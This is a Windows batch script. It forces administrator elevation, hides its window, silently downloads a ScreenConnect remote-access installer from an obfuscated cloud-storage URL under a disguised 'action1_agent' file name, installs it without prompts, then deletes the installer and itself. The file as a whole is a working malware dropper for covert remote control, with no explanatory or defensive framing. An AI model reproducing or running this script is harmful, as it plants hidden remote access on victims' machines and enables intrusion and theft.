@echo off
:: Auto-elevate to administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Hide everything after elevation
if not defined HIDE_CONSOLE (
    set HIDE_CONSOLE=1
    start /min "" "%~f0" %* & exit
)

:: Hide command output
@echo off >nul 2>&1
cls

set "TEMP_MSI=%TEMP%\action1_agent_%RANDOM%.msi"
set "MSI_URL=https://fb4d9a0-4c61-453e-8529-746ff2666cca-41c360e1c50b.s3.dualstack.us-east-2.amazonaws.com/6d47438c-51bb-4057-ae3f-84894cf615a1bceef0be-a484-43bf-b204-0577f66d4be3d0dde338-ea4a-4fda-a67b-9b07e262fbe6/d67e77dd-b2d3-47ec-bee8-f59b7469f41b15d70ba1-edf2-4468-8b71-59b54925d5777d34693f-c1d4-4422-82fb-e6ee72f3325b/75435665-0875-4ebf-9e01-120c939cbc76419790b0-67be-45fc-a067-27662d9b2a0f54be9d5c-8cb9-4fb5-8eb9-196c1983c4bb/75435665-0875-4ebf-9e01-120c939cbc76419790b0-67be-45fc-a067-27662d9b2a0f54be9d5c-8cb9-4fb5-8eb9-196c1983c4bb/ed41feb3-a932-46e8-a50e-6d1be731ee15c77d659c-ac7f-4015-a86e-17c2682f7c02ea729785-3637-4cf8-8638-a8659297010c/ScreenConnect.ClientSetup.msi"

:: Download MSI (completely silent)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%MSI_URL%' -OutFile '%TEMP_MSI%'" >nul 2>&1

:: Install MSI silently if download succeeded
if exist "%TEMP_MSI%" (
    start /wait msiexec /i "%TEMP_MSI%" /qn /norestart /quiet >nul 2>&1
    timeout /t 2 /nobreak >nul
    del "%TEMP_MSI%" 2>nul
)

:: Self-delete and close
( goto ) 2>nul & del "%~f0" & exit